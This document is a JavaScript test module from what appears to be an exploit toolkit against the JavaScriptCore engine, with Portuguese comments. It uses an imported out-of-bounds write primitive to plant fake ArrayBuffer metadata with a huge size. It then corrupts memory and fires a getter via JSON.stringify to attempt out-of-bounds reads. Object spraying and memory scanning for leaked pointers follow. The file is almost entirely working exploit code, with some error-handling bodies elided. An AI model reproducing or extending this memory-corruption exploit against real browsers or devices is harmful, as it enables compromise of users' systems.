// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForLengthCorruptionAndSnoop";
let getter_called_flag = false;
let current_test_results = { success: false, message: "Teste não iniciado.", error: null, potential_leaks: [] };

const CORRUPTION_OFFSET = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
const CORRUPTION_VALUE = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

// Metadados sombra para tentar dar um tamanho GIGANTE ao oob_array_buffer_real
const SHADOW_HUGE_SIZE = new AdvancedInt64(0x7FFFFFF0, 0x0); // Quase 2GB, alinhado
// O ponteiro de dados para os metadados sombra pode ser o início do próprio oob_ab_data ou um offset fixo.
// Se oob_read_absolute usa oob_dataview_real, que tem um byteOffset, precisamos considerar isso.
// Para este teste, vamos assumir que o SHADOW_DATA_POINTER é relativo ao início do ArrayBuffer.
// Se oob_array_buffer_real.buffer aponta para o início da alocação, então 0x0 está OK.
const SHADOW_DATA_POINTER_FOR_HUGE_AB = new AdvancedInt64(0x0, 0x0); // Aponta para o início do próprio oob_ab_data


class CheckpointForLengthCorruption {
    constructor(id) {
        this.id_marker = `LengthCorruptionCheckpoint-${id}`;
    }

    get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
        getter_called_flag = true;
        const FNAME_GETTER = "LengthCorruption_Getter";
        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
        current_test_results = { success: false, message: "Getter chamado.", error: null, potential_leaks: [] };

        let found_leak_or_corruption = false;

        // Tentativa 1: Criar Uint32Array sobre oob_array_buffer_real esperando que use SHADOW_HUGE_SIZE
        try {
            logS3("DENTRO DO GETTER (Tentativa 1): new Uint32Array(oob_array_buffer_real)...", "info", FNAME_GETTER);
            if (!oob_array_buffer_real) throw new Error("oob_array_buffer_real is null");

            const reader_array = new Uint32Array(oob_array_buffer_real);
            logS3(`DENTRO DO GETTER (Tentativa 1): Uint32Array criado. Length: ${reader_array.length}. oob_ab.byteLength: ${oob_array_buffer_real.byteLength}`, "info", FNAME_GETTER);

            // O tamanho esperado em elementos de Uint32Array seria SHADOW_HUGE_SIZE / 4
            const expected_shadow_len_u32 = SHADOW_HUGE_SIZE.low() / 4;

            if (reader_array.length === expected_shadow_len_u32) {
                logS3(`DENTRO DO GETTER (Tentativa 1): SUCESSO ESPECULATIVO! Uint32Array.length (${reader_array.length}) CORRESPONDE ao tamanho sombra!`, "vuln", FNAME_GETTER);
                current_test_results.message = `Uint32Array sobre oob_ab tem tamanho sombra (${reader_array.length})!`;
                current_test_results.success = true;
                found_leak_or_corruption = true;
                // Tentar ler um pouco além do tamanho original do oob_array_buffer_real
                // O tamanho original em u32 é oob_array_buffer_real.byteLength / 4
                const original_len_u32 = oob_array_buffer_real.byteLength / 4;
                if (reader_array.length > original_len_u32) {
                    try {
                        const out_of_bounds_val = reader_array[original_len_u32 + 10]; // Ler um pouco além
                        logS3(`DENTRO DO GETTER (Tentativa 1): Leitura OOB especulativa em índice ${original_len_u32 + 10} retornou: ${toHex(out_of_bounds_val)}`, "leak", FNAME_GETTER);
                        current_test_results.potential_leaks.push(`OOB Read[${original_len_u32 + 10}]: ${toHex(out_of_bounds_val)}`);
                    } catch (e_oob_read) {
                         logS3(`DENTRO DO GETTER (Tentativa 1): Erro na leitura OOB especulativa: ${e_oob_read.message}`, "error", FNAME_GETTER);
                         current_test_results.error = `Erro OOB Read: ${e_oob_read.message}`;
                    }
                }
            } else {
                logS3(`DENTRO DO GETTER (Tentativa 1): Uint32Array.length (${reader_array.length}) NÃO corresponde ao tamanho sombra. Usou buffer original.`, "warn", FNAME_GETTER);
                if (!found_leak_or_corruption) current_test_results.message = `Tentativa 1: Uint32Array usou buffer original. Length: ${reader_array.length}`;
            }
        } catch (e) {
            logS3(`DENTRO DO GETTER (Tentativa 1): ERRO com Uint32Array(oob_ab): ${e.message}`, "error", FNAME_GETTER);
            if (!found_leak_or_corruption) current_test_results.message = `Tentativa 1 Erro: ${e.message}`;
            current_test_results.error = String(e);
        }

        // Tentativa 2: Sondar oob_array_buffer_real após criar muitos objetos (se Tentativa 1 falhou em mostrar re-tipagem)
        if (!found_leak_or_corruption) {
            logS3("DENTRO DO GETTER (Tentativa 2): Tentativa 1 falhou em mostrar re-tipagem. Criando objetos e sondando oob_ab...", "info", FNAME_GETTER);
            let spray_objs = [];
            for(let i=0; i < 50; i++) spray_objs.push({id:i, data: "spray_data_" + Math.random()}); // Spray simples

            const snoop_start = 0;
            const snoop_end = Math.min(0x200, oob_array_buffer_real.byteLength); // Sondar primeiros 512 bytes ou até o fim
            let snoop_data_found = [];
            let potential_ptr_count = 0;

            for (let offset = snoop_start; offset < snoop_end; offset += 8) {
                try {
                    const value_read = oob_read_absolute(offset, 8);
                    const is_corruption_val = (offset === CORRUPTION_OFFSET && value_read.equals(CORRUPTION_VALUE));
                    if (!value_read.equals(AdvancedInt64.Zero) && !is_corruption_val) {
                        const value_str = value_read.toString(true);
                        snoop_data_found.push(`${toHex(offset)}: ${value_str}`);
                        // Heurística simples para ponteiro
                        if (value_read.high() > 0x1000 && value_read.high() < 0x80000000) { // Exemplo de intervalo
                            logS3(`DENTRO DO GETTER (Tentativa 2): VALOR SUSPEITO em oob_data[${toHex(offset)}] = ${value_str}`, "leak", FNAME_GETTER);
                            potential_ptr_count++;
                        }
                    }
                } catch(e_snoop) { /* ignorar erros de leitura individuais */ }
            }
            if (snoop_data_found.length > 0) {
                 logS3(`DENTRO DO GETTER (Tentativa 2): Dados não-zero encontrados na sondagem (excluindo valor de corrupção): ${snoop_data_found.join('; ')}`, "info", FNAME_GETTER);
                 current_test_results.potential_leaks.push(...snoop_data_found);
            }
            if (potential_ptr_count > 0) {
                current_test_results.success = true;
                current_test_results.message = `Tentativa 2: Encontrado(s) ${potential_ptr_count} ponteiro(s) suspeito(s) em oob_ab após spray.`;
                found_leak_or_corruption = true;
            } else if (!found_leak_or_corruption) {
                 current_test_results.message = "Tentativa 1 falhou. Tentativa 2 (sondagem após spray) não encontrou ponteiros óbvios.";
            }
        }
        return 0xBADF00D;
    }

    toJSON() {
        const FNAME_toJSON = "CheckpointForLengthCorruption.toJSON";
        logS3(`toJSON para: ${this.id_marker}. Acessando getter...`, "info", FNAME_toJSON);
        // eslint-disable-next-line no-unused-vars
        const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME];
        return { id: this.id_marker, processed_by_len_corr_test: true };
    }
}


export async function executeRetypeOOB_AB_Test() { // Nome da função exportada mantido
    const FNAME_TEST = "executeLengthCorruptionAndSnoopTest"; // Nome interno
    logS3(`--- Iniciando Teste de Corrupção de Length Especulativa / Sondagem ---`, "test", FNAME_TEST);

    getter_called_flag = false;
    current_test_results = { success: false, message: "Teste não executado.", error: null, potential_leaks: [] };

    if (!JSC_OFFSETS.ArrayBufferContents /* ... etc ... */) { /* ... validação ... */ return; }

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) { /* ... erro ... */ return; }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST);

        // 1. Plantar "Metadados Sombra" com tamanho GIGANTE
        const shadow_contents_offset_in_oob_data = 0x0;
        oob_write_absolute(shadow_contents_offset_in_oob_data + JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START, SHADOW_HUGE_SIZE, 8);
        oob_write_absolute(shadow_contents_offset_in_oob_data + JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START, SHADOW_DATA_POINTER_FOR_HUGE_AB, 8);
        logS3(`Metadados sombra (tamanho gigante) plantados: ptr=${SHADOW_DATA_POINTER_FOR_HUGE_AB.toString(true)}, size=${SHADOW_HUGE_SIZE.toString(true)}`, "info", FNAME_TEST);

        // 2. Realizar a escrita OOB "gatilho"
        oob_write_absolute(CORRUPTION_OFFSET, CORRUPTION_VALUE, 8);
        logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET)} do oob_data completada.`, "info", FNAME_TEST);

        // 3. Criar o objeto Checkpoint e chamar JSON.stringify
        const checkpoint_obj_for_len_test = new CheckpointForLengthCorruption(1);
        logS3(`CheckpointForLengthCorruption objeto criado. ID: ${checkpoint_obj_for_len_test.id_marker}`, "info", FNAME_TEST);
        
        logS3(`Chamando JSON.stringify(checkpoint_obj_for_len_test)...`, "info", FNAME_TEST);
        let stringify_result = null;
        try {
            stringify_result = JSON.stringify(checkpoint_obj_for_len_test);
            logS3(`JSON.stringify completado. Resultado: ${stringify_result}`, "info", FNAME_TEST);
        } catch (e) { /* ... erro ... */ }

    } catch (mainError) { /* ... erro principal ... */ }
    finally { /* ... limpeza ... */ }

    if (getter_called_flag) {
        if (current_test_results.success) {
            logS3(`RESULTADO TESTE LENGTH/SNOOP: SUCESSO ESPECULATIVO! ${current_test_results.message}`, "vuln", FNAME_TEST);
        } else {
            logS3(`RESULTADO TESTE LENGTH/SNOOP: Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST);
        }
        if (current_test_results.potential_leaks && current_test_results.potential_leaks.length > 0) {
            logS3("Potenciais Endereços/Dados Vazados Detalhados:", "leak", FNAME_TEST);
            current_test_results.potential_leaks.forEach(leak_info => {
                logS3(`  ${leak_info}`, "leak", FNAME_TEST); // Ajustado para logar strings diretamente
            });
        }
    } else { /* ... getter não chamado ... */ }

    clearOOBEnvironment();
    logS3(`--- Teste de Corrupção de Length Especulativa / Sondagem Concluído ---`, "test", FNAME_TEST);
}
